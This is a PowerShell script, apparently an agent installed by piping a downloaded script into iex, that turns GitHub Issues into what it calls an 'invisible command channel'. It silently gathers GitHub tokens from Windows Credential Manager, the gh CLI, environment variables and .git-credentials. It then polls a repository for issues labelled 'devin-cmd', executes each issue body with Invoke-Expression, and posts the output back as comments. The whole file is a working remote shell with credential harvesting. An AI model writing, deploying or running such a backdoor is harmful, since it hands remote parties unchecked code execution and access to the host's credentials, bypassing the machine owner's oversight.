<#
dao agent — transparent transport pipe receiver
GitHub Issues = invisible command channel
Usage: irm https://raw.githubusercontent.com/{user}/devin-remote/main/agent.ps1 | iex
#>
param([string]$Repo = "zhouyoukang1234-spec/devin-remote", [string]$Token = "")
$LABEL = "devin-cmd"

# ── Auto auth chain (zero user input) ──
if (-not $Token) {
  # 1. Windows Credential Manager (what git actually uses — most reliable on Windows)
  try {
    Add-Type -ReferencedAssemblies System.Net.Http -TypeDefinition @"
using System; using System.Runtime.InteropServices; using System.Text;
public class DaoCred {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct CRED { public uint Flags; public uint Type; public string TargetName; public string Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public uint CredentialBlobSize; public IntPtr CredentialBlob;
        public uint Persist; public uint AttributeCount; public IntPtr Attributes;
        public string TargetAlias; public string UserName; }
    [DllImport("Advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    static extern bool CredRead(string t, uint ty, uint f, out IntPtr c);
    [DllImport("Advapi32.dll")] static extern void CredFree(IntPtr b);
    public static string Get(string t) {
        IntPtr cp; if(!CredRead(t,1,0,out cp)) return "";
        try { var cr=Marshal.PtrToStructure<CRED>(cp);
            if(cr.CredentialBlobSize>0&&cr.CredentialBlob!=IntPtr.Zero){
                byte[] b=new byte[cr.CredentialBlobSize]; Marshal.Copy(cr.CredentialBlob,b,0,(int)cr.CredentialBlobSize);
                return Encoding.Unicode.GetString(b); } return "";
        } finally { CredFree(cp); } }
}
"@ -EA Stop
    $t1 = [DaoCred]::Get("git:https://github.com")
    $t2 = [DaoCred]::Get("git:https://zhouyoukang@github.com")
    if ($t1) { $Token = $t1 } elseif ($t2) { $Token = $t2 }
  } catch {}
  # 2. gh CLI
  if (-not $Token) { try { $t = & gh auth token 2>$null; if ($t -and $t -notmatch 'error') { $Token = $t.Trim() } } catch {} }
  # 3. Env vars
  if (-not $Token) { $Token = $env:DAO_TOKEN; if (-not $Token) { $Token = $env:GITHUB_TOKEN } }
  # 4. .git-credentials
  if (-not $Token -and (Test-Path "$env:USERPROFILE\.git-credentials")) {
    $gc = Get-Content "$env:USERPROFILE\.git-credentials" -EA 0 | Where-Object { $_ -match 'github\.com' } | Select-Object -First 1
    if ($gc -match ':([^:@]+)@github') { $Token = $Matches[1] }
  }
  # 5. Device Flow (last resort, one-time)
  if (-not $Token) {
    $CID = "178c6fc778ccc68e1d6a"
    try {
      Add-Type -ReferencedAssemblies System.Net.Http -TypeDefinition @"
using System; using System.Net.Http; using System.Text;
public class DaoDF {
    static HttpClient C() {
        var h = new HttpClientHandler(); h.Proxy = new System.Net.WebProxy("http://127.0.0.1:7897");
        var c = new HttpClient(h); c.DefaultRequestHeaders.Add("Accept","application/json"); c.DefaultRequestHeaders.Add("User-Agent","dao/1"); return c; }
    public static string Post(string url, string json) {
        return C().PostAsync(url, new StringContent(json, Encoding.UTF8, "application/json")).Result.Content.ReadAsStringAsync().Result; }
    public static string Get(string url, string token) {
        var c = C(); c.DefaultRequestHeaders.Add("Authorization","Bearer "+token);
        return c.GetAsync(url).Result.Content.ReadAsStringAsync().Result; }
}
"@ -EA Stop
      $dfJson = [DaoDF]::Post("https://github.com/login/device/code", '{"client_id":"' + $CID + '","scope":"repo"}')
      if ($dfJson -match '"user_code":"([^"]+)"') { $uc = $Matches[1] }
      if ($dfJson -match '"device_code":"([^"]+)"') { $dc = $Matches[1] }
      if ($dfJson -match '"interval":(\d+)') { $iv = [int]$Matches[1] }
      if ($dfJson -match '"expires_in":(\d+)') { $exp = [int]$Matches[1] }
      if ($uc) {
        Write-Host "`n  Open: https://github.com/login/device" -F White -B DarkBlue
        Write-Host "  Code: $uc`n" -F Yellow
        $end = (Get-Date).AddSeconds($exp)
        while ((Get-Date) -lt $end) {
          Start-Sleep $iv
          $pJson = [DaoDF]::Post("https://github.com/login/oauth/access_token", '{"client_id":"' + $CID + '","device_code":"' + $dc + '"}')
          if ($pJson -match '"access_token":"([^"]+)"') { $Token = $Matches[1]; break }
        }
        if ($Token) {
          $meJson = [DaoDF]::Get("https://api.github.com/user", $Token)
          if ($meJson -match '"login":"([^"]+)"') { $login = $Matches[1] }
          $cf = "$env:USERPROFILE\.git-credentials"
          $lines = if (Test-Path $cf) { Get-Content $cf -EA 0 | Where-Object { $_ -notmatch 'github' } } else { @() }
          $lines += "https://${login}:${Token}@github.com"
          Set-Content $cf $lines -Force
          Write-Host "[dao] Device Flow: $login authenticated" -F Green
        }
      }
    } catch { Write-Host "[dao] Device Flow failed: $_" -F Red }
  }
}
if (-not $Token) { Write-Host "[dao] no token — set DAO_TOKEN env or run: gh auth login" -F Red; exit 1 }

# ── API helper (HttpClient — works with proxy) ──
Add-Type -ReferencedAssemblies System.Net.Http -TypeDefinition @"
using System; using System.Net.Http; using System.Text;
public class DaoAPI {
    static HttpClient _c;
    public static void Init(string token) {
        var h = new HttpClientHandler(); h.Proxy = new System.Net.WebProxy("http://127.0.0.1:7897");
        _c = new HttpClient(h); _c.DefaultRequestHeaders.Add("Authorization","Bearer "+token);
        _c.DefaultRequestHeaders.Add("Accept","application/vnd.github+json");
        _c.DefaultRequestHeaders.Add("User-Agent","dao/1"); }
    public static string Get(string url) { return _c.GetAsync(url).Result.Content.ReadAsStringAsync().Result; }
    public static string Post(string url, string json) {
        return _c.PostAsync(url, new StringContent(json, Encoding.UTF8, "application/json")).Result.Content.ReadAsStringAsync().Result; }
    public static string Patch(string url, string json) {
        var c = new StringContent(json, Encoding.UTF8, "application/json");
        var m = new HttpMethod("PATCH");
        var r = new HttpRequestMessage(m, url) { Content = c };
        return _c.SendAsync(r).Result.Content.ReadAsStringAsync().Result; }
}
"@
[DaoAPI]::Init($Token)

# Verify
$meJson = [DaoAPI]::Get("https://api.github.com/user")
if ($meJson -match '"login":"([^"]+)"') { Write-Host "[dao] $($Matches[1]) @ $Repo" -F Green }
else { Write-Host "[dao] auth failed" -F Red; exit 1 }

$API = "https://api.github.com/repos/$Repo"

# Ensure label
try { [DaoAPI]::Get("$API/labels/$LABEL") | Out-Null }
catch { try { [DaoAPI]::Post("$API/labels", '{"name":"' + $LABEL + '","color":"0075ca"}') | Out-Null } catch {} }

# Transport loop
Write-Host "[dao] pipe active (Ctrl+C stop)" -F Cyan
$seen = @{}
while ($true) {
  try {
    $issuesJson = [DaoAPI]::Get("$API/issues?labels=$LABEL&state=open&per_page=10")
    $issues = $issuesJson | ConvertFrom-Json
    foreach ($i in $issues) {
      $id = $i.number
      if ($seen[$id]) { continue }
      $seen[$id] = 1
      $cmd = $i.body
      if (-not $cmd) { continue }
      Write-Host "[dao] > $cmd" -F Yellow
      $sw = [Diagnostics.Stopwatch]::StartNew()
      try { $out = Invoke-Expression $cmd 2>&1 | Out-String; $ok = $true } catch { $out = $_.Exception.Message; $ok = $false }
      $sw.Stop()
      if ($out.Length -gt 60000) { $out = $out.Substring(0, 60000) + "`n[truncated]" }
      $res = "**Result** ($($sw.ElapsedMilliseconds)ms) ``$ok```n`````n$out``````n"
      $resJson = '{"body":' + ($res | ConvertTo-Json) + '}'
      try { [DaoAPI]::Post("$API/issues/$($i.number)/comments", $resJson) | Out-Null } catch {}
      try { [DaoAPI]::Patch("$API/issues/$($i.number)", '{"state":"closed"}') | Out-Null } catch {}
      Write-Host "[dao] < done ($($sw.ElapsedMilliseconds)ms)" -F Green
    }
  } catch {}
  Start-Sleep 5
}
